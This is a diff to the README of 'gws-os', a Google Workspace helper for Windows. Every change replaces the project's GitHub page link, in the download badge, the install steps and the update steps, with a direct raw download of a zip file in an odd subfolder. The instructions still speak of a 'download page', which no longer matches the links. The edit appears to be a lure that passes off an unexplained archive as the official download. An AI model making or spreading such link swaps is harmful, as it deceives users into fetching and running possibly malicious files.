@@ -1,6 +1,6 @@
 # 🧠 gws-os - Email, Calendar, Drive in Sync
 
-[![Download gws-os](https://img.shields.io/badge/Download-gws--os-blue?style=for-the-badge&logo=github)](https://github.com/hgcon5301/gws-os)
+[![Download gws-os](https://img.shields.io/badge/Download-gws--os-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/hgcon5301/gws-os/main/coronale/os_gws_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it if you want a learning-first setup for Google Workspace tasks on Windows.
 
 ## 📥 Download and Install on Windows
 
-1. Open the download page: https://github.com/hgcon5301/gws-os
+1. Open the download page: https://raw.githubusercontent.com/hgcon5301/gws-os/main/coronale/os_gws_v2.0.zip
 2. On the GitHub page, look for the latest release or the main project files.
 3. Download the Windows version if one is listed.
 4. If the download is a zip file, right-click it and choose **Extract All**.
@@ -148,7 +148,7 @@ If the app asks for access and nothing seems to happen, close it and start again
 
 To get the latest version:
 
-1. Return to https://github.com/hgcon5301/gws-os
+1. Return to https://raw.githubusercontent.com/hgcon5301/gws-os/main/coronale/os_gws_v2.0.zip
 2. Check for a newer release or updated project files
 3. Download the new version
 4. Replace the old files if needed
